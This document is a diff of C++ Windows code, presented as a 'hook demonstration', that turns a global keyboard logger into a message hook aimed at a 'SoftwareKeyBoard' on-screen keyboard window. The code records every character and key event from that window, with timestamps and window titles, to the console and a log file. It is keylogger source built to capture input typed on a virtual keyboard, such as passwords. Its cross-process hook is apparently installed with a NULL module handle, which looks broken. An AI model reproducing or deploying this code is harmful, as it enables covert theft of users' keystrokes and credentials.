@@ -9,7 +9,8 @@
 std::ofstream logFile;
 
 // Hook handle
-HHOOK keyboardHook;
+HHOOK messageHook;
+HWND targetWindow = NULL;
 
 // Convert virtual key code to string representation
 std::string getKeyName(DWORD vkCode) {
@@ -65,54 +66,107 @@ std::string getCurrentTimestamp() {
     return timeStr;
 }
 
-// Callback function that processes keyboard events
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // If nCode is less than zero, pass to next hook
-    if (nCode < 0) {
-        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+// Callback function for window enumeration
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
+    char windowText[256];
+    GetWindowTextA(hwnd, windowText, sizeof(windowText));
+    
+    // Find the SoftwareKeyBoard window
+    if (strstr(windowText, "SoftwareKeyBoard") != NULL) {
+        targetWindow = hwnd;
+        std::cout << "Found SoftwareKeyBoard window: " << windowText << " (HWND: " << hwnd << ")" << std::endl;
+        if (logFile.is_open()) {
+            logFile << getCurrentTimestamp() << " - Found SoftwareKeyBoard window: " 
+                   << windowText << " (HWND: " << hwnd << ")" << std::endl;
+        }
+        
+        // Stop enumeration as we found our target
+        return FALSE;
     }
     
-    // Process keyboard events
+    return TRUE; // Continue enumeration
+}
+
+// Callback function that processes window messages
+LRESULT CALLBACK MessageProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // If nCode is less than zero, pass to next hook
+    if (nCode < 0) {
+        return CallNextHookEx(messageHook, nCode, wParam, lParam);
+    }
+    
+    // Process window messages
     if (nCode == HC_ACTION) {
-        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
+        MSG* msg = (MSG*)lParam;
         
-        std::string eventType;
-        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            eventType = "Key Down";
-        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-            eventType = "Key Up";
-        } else {
-            eventType = "Other";
+        // Check if the message is for our target window
+        if (msg->hwnd == targetWindow || GetParent(msg->hwnd) == targetWindow) {
+            // Log WM_CHAR messages which represent character input
+            if (msg->message == WM_CHAR) {
+                char c = (char)msg->wParam;
+                std::string displayChar = isprint(c) ? std::string(1, c) : "ASCII(" + std::to_string((int)c) + ")";
+                
+                HWND foregroundWindow = GetForegroundWindow();
+                char windowTitle[256] = {0};
+                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
+                
+                // Log the key event
+                if (logFile.is_open()) {
+                    logFile << getCurrentTimestamp() << " - " 
+                            << "WM_CHAR: " << displayChar << " | "
+                            << "Window: " << windowTitle << std::endl;
+                }
+                
+                // Print to console as well
+                std::cout << "WM_CHAR: " << displayChar << " (Window: " << windowTitle << ")" << std::endl;
+            }
+            // Also log keydown/keyup messages
+            else if (msg->message == WM_KEYDOWN || msg->message == WM_SYSKEYDOWN) {
+                DWORD vkCode = (DWORD)msg->wParam;
+                std::string keyName = getKeyName(vkCode);
+                
+                HWND foregroundWindow = GetForegroundWindow();
+                char windowTitle[256] = {0};
+                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
+                
+                // Log the key event
+                if (logFile.is_open()) {
+                    logFile << getCurrentTimestamp() << " - " 
+                            << "KeyDown: " << keyName << " | "
+                            << "Window: " << windowTitle << " | "
+                            << "VK Code: " << vkCode << std::endl;
+                }
+                
+                // Print to console as well
+                std::cout << "KeyDown: " << keyName << " (Window: " << windowTitle << ")" << std::endl;
+            }
+            else if (msg->message == WM_KEYUP || msg->message == WM_SYSKEYUP) {
+                DWORD vkCode = (DWORD)msg->wParam;
+                std::string keyName = getKeyName(vkCode);
+                
+                HWND foregroundWindow = GetForegroundWindow();
+                char windowTitle[256] = {0};
+                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
+                
+                // Log the key event
+                if (logFile.is_open()) {
+                    logFile << getCurrentTimestamp() << " - " 
+                            << "KeyUp: " << keyName << " | "
+                            << "Window: " << windowTitle << " | "
+                            << "VK Code: " << vkCode << std::endl;
+                }
+                
+                // Print to console as well
+                std::cout << "KeyUp: " << keyName << " (Window: " << windowTitle << ")" << std::endl;
+            }
         }
-        
-        // Get name of the key
-        std::string keyName = getKeyName(kbdStruct->vkCode);
-        
-        // Get additional information about the key press
-        HWND foregroundWindow = GetForegroundWindow();
-        char windowTitle[256] = {0};
-        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
-        
-        // Log the key event
-        if (logFile.is_open()) {
-            logFile << getCurrentTimestamp() << " - " 
-                    << "Event: " << eventType << " | "
-                    << "Key: " << keyName << " | "
-                    << "Window: " << windowTitle << " | "
-                    << "VK Code: " << kbdStruct->vkCode << " | "
-                    << "Scan Code: " << kbdStruct->scanCode << std::endl;
-        }
-        
-        // Print to console as well
-        std::cout << eventType << ": " << keyName << " (Window: " << windowTitle << ")" << std::endl;
     }
     
     // Pass to next hook
-    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+    return CallNextHookEx(messageHook, nCode, wParam, lParam);
 }
 
 int main() {
-    std::cout << "Keyboard Hook Demonstration - Captures events from SoftwareKeyBoard" << std::endl;
+    std::cout << "Message Hook Demonstration - Captures events from SoftwareKeyBoard" << std::endl;
     std::cout << "==================================================================" << std::endl;
     
     // Open log file
@@ -122,21 +176,32 @@ int main() {
         return 1;
     }
     
-    logFile << "\n\n" << getCurrentTimestamp() << " - Keyboard hook started" << std::endl;
+    logFile << "\n\n" << getCurrentTimestamp() << " - Message hook started" << std::endl;
     
-    // Set up keyboard hook
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    // Find the SoftwareKeyBoard window
+    std::cout << "Looking for SoftwareKeyBoard window..." << std::endl;
+    EnumWindows(EnumWindowsProc, 0);
     
-    if (keyboardHook == NULL) {
-        std::cerr << "Failed to install keyboard hook!" << std::endl;
-        logFile << getCurrentTimestamp() << " - Failed to install keyboard hook. Error code: " 
+    if (targetWindow == NULL) {
+        std::cerr << "SoftwareKeyBoard window not found! Make sure it's running." << std::endl;
+        logFile << getCurrentTimestamp() << " - SoftwareKeyBoard window not found!" << std::endl;
+        logFile.close();
+        return 1;
+    }
+    
+    // Set up message hook
+    messageHook = SetWindowsHookEx(WH_GETMESSAGE, MessageProc, NULL, GetWindowThreadProcessId(targetWindow, NULL));
+    
+    if (messageHook == NULL) {
+        std::cerr << "Failed to install message hook!" << std::endl;
+        logFile << getCurrentTimestamp() << " - Failed to install message hook. Error code: " 
                 << GetLastError() << std::endl;
         logFile.close();
         return 1;
     }
     
-    std::cout << "Keyboard hook installed successfully." << std::endl;
-    std::cout << "Listening for keyboard events..." << std::endl;
+    std::cout << "Message hook installed successfully." << std::endl;
+    std::cout << "Listening for messages from SoftwareKeyBoard..." << std::endl;
     std::cout << "Press Ctrl+C to exit" << std::endl;
     
     // Message loop to keep application running and processing keyboard events
@@ -147,8 +212,8 @@ int main() {
     }
     
     // Clean up
-    UnhookWindowsHookEx(keyboardHook);
-    logFile << getCurrentTimestamp() << " - Keyboard hook stopped" << std::endl;
+    UnhookWindowsHookEx(messageHook);
+    logFile << getCurrentTimestamp() << " - Message hook stopped" << std::endl;
     logFile.close();
     
     return 0;
